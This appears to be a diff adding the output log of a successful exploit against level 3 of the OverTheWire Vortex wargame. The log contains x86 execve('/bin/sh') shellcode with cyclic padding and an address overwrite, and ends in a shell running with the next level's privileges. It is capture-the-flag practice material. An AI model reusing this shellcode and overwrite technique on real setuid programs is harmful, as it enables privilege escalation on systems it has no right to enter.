@@ -1,0 +1,9 @@
+[+] Connecting to vortex.labs.overthewire.org on port 22: OK
+[+] Found '/vortex/vortex3' in ssh cache
+[*] Stack is executable!
+[*] p_exit == 8048322
+ 8048320:       ff 25 38 97 04 08       jmp    DWORD PTR ds:0x8049738
+[+] Opening new channel: '/vortex/vortex3 $\'1\\xc9\\xf7\\xe9j\\x01\\xfe\\x0c$h//shh/bin\\xb0\\x0b\\x89\\xe3\\xcd\\x80aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaa
+akaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaa"\\x83\\x04\\x08\'': OK
+[+] id: uid=5003(vortex3) gid=5003(vortex3) euid=5004(vortex4) groups=5004(vortex4),5003(vortex3)
+[+] password: <removed>
